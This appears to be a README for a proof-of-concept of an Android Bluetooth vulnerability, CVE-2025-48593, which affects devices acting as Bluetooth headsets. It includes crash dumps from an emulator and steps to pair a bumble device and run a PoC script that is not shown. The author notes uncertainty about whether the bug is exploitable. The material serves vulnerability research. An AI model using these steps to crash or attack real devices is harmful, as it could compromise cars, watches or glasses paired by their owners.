Maybe a Proof-of-concept for [CVE-2025-48593](https://source.android.com/docs/security/bulletin/2025-11-01) based on examining the [patch](https://android.googlesource.com/platform/packages/modules/Bluetooth/+/b8153e05d0b9224feb0ace8c24eeeadc80e4dffc)?

You shouldn't worry about this: as far as I can tell, phones are **NOT** vulnerable to CVE-2025-48593. This only affects devices that support acting as Bluetooth headphones / speakers, such as smartwatches, smart glasses, or cars. In addition, an attacker has to get a victim to pair to the attacker before they can access the headset service. As long as you don't accept the pairing request on your smartwatch/glasses/car, you should be fine.

I'm not sure if this proof-of-concept actually hits the exploitable code path, since I only get a null deference or an attempted write into the library's read-only data section.

After forcing the emulator to act as a Bluetooth speaker, running this code gives a null deference:

```
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'google/sdk_gphone64_arm64/emu64a:15/AE3A.240806.043/12960925:userdebug/dev-keys'
Revision: '0'
ABI: 'arm64'
Timestamp: 2025-11-13 22:03:35.264596895-0500
Process uptime: 0s
Cmdline: com.google.android.bluetooth
pid: 5549, tid: 5589, name: bt_main_thread  >>> com.google.android.bluetooth <<<
uid: 1002
tagged_addr_ctrl: 0000000000000001 (PR_TAGGED_ADDR_ENABLE)
pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x2a20010000000000
    x0  00000074d49ccf5a  x1  b4000076cb2f4f80  x2  0000000000000035  x3  000000752fd5403c
    x4  b4000075cb32c6f9  x5  b40000764b322462  x6  0000000000000035  x7  b4000076db2ef159
    x8  0007ac63ecbcb3da  x9  0000000000000002  x10 b40000764b322460  x11 00000074d476c3a4
    x12 000000000000000c  x13 000000007fffffff  x14 0000000000000001  x15 000006a9e9459ce0
    x16 00000074d4974360  x17 00000077fcd25700  x18 00000074d0aa8060  x19 00000074d49ccf5a
    x20 00000074d3e9d98b  x21 2a20010000000000  x22 00000074d3e28d23  x23 00000074d414ae8c
    x24 000000752fd54a80  x25 0000000000003002  x26 b4000076cb2f4f80  x27 00000074d3e9d92c
    x28 000000752fd541f0  x29 000000752fd53fd0
    lr  00000074d476702c  sp  000000752fd53940  pc  00000074d476ab88  pst 0000000060001000

14 total frames
backtrace:
      #00 pc 0000000000969b88  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdpu_log_attribute_metrics(RawAddress const&, tSDP_DISCOVERY_DB*)+284) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #01 pc 0000000000966028  /apex/com.android.btservices/lib64/libbluetooth_jni.so (process_service_search_attr_rsp(tCONN_CB*, unsigned char*, unsigned char*)+1104) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #02 pc 0000000000965884  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdp_data_ind(unsigned short, BT_HDR*)+296) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #03 pc 00000000009f45cc  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_csm_execute(t_l2c_ccb*, tL2CEVT, void*)+12968) (BuildId: 6f08819253185bc44c9fec07ed93c598)
```

With [malloc_debug](https://android.googlesource.com/platform/bionic/+/master/libc/malloc_debug/README.md) set to fill on free, I get:

```
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'google/sdk_gphone64_arm64/emu64a:15/AE3A.240806.043/12960925:userdebug/dev-keys'
Revision: '0'
ABI: 'arm64'
Timestamp: 2025-11-13 22:44:39.509419570-0500
Process uptime: 0s
Cmdline: com.google.android.bluetooth
pid: 7391, tid: 7422, name: bt_main_thread  >>> com.google.android.bluetooth <<<
uid: 1002
tagged_addr_ctrl: 0000000000000001 (PR_TAGGED_ADDR_ENABLE)
pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
signal 11 (SIGSEGV), code 2 (SEGV_ACCERR), fault addr 0xb4000076954f3000
    x0  b4000076954f3002  x1  b4000076954e48a8  x2  000000000000ebeb  x3  000000764031dd58
    x4  0000000000000004  x5  68746f6f7465756c  x6  68746f6f7465756c  x7  b4000076f54d5ad9
    x8  b4000076954f2fff  x9  000000000000d78b  x10 0000000000000009  x11 0000000000000009
    x12 000000000000d78b  x13 0000000000000008  x14 0000000000000004  x15 000006b7ae6ad944
    x16 0000000000000001  x17 000000794c270af0  x18 0000007578ca8070  x19 000000757e7cff58
    x20 0000000000000000  x21 0000000000000000  x22 b4000076954c9950  x23 0000000000000043
    x24 000000764031ea80  x25 b4000076954c9965  x26 b4000076954c9968  x27 000000764031ea80
    x28 000000764031df70  x29 000000764031ddb0
    lr  000000757e569d30  sp  000000764031dd50  pc  000000757e56ec08  pst 0000000080001000

17 total frames
backtrace:
      #00 pc 000000000096ac08  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdpu_build_attrib_seq(unsigned char*, unsigned short*, unsigned short)+112) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #01 pc 0000000000965d2c  /apex/com.android.btservices/lib64/libbluetooth_jni.so (process_service_search_attr_rsp(tCONN_CB*, unsigned char*, unsigned char*)+340) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #02 pc 0000000000965494  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdp_config_cfm(unsigned short, unsigned short, tL2CAP_CFG_INFO*)+248) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #03 pc 00000000009f7364  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_csm_indicate_connection_open(t_l2c_ccb*)+220) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #04 pc 00000000009f346c  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_csm_execute(t_l2c_ccb*, tL2CEVT, void*)+8520) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #05 pc 00000000009fe380  /apex/com.android.btservices/lib64/libbluetooth_jni.so (process_l2cap_cmd(t_l2c_linkcb*, unsigned char*, unsigned short)+376) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #06 pc 00000000009fdf64  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_rcv_acl_data(BT_HDR*)+624) (BuildId: 6f08819253185bc44c9fec07ed93c598)
```

## Running

To make Android Emulator emulate a Bluetooth headphone:

Start a local Android Emulator for Android 15 in Android Studio. (I'm using Android Emulator for Android 15, "Google APIs ARM 64 v8a System Image", version 9)

```
adb root
adb shell
setprop bluetooth.profile.hfp.hf.enabled true
# optionally:
# setprop wrap.com.google.android.bluetooth "LIBC_DEBUG_MALLOC_OPTIONS=fill\ verbose"
am force-stop com.google.android.bluetooth
```

Then

```
python3 -m venv env
. env/bin/activate
pip install bumble
bumble-pair --mode classic device.json android-netsim DA:4C:10:DE:17:00
# accept pairing in terminal and in emulator, then Ctrl+C after pairing completes
python3 blueshrimp.py
# you may need to run it twice for some reason...
```

## Tools

This repo also contains a `dumpbt.js` Frida script for tracing the Bluetooth process in the emulator.
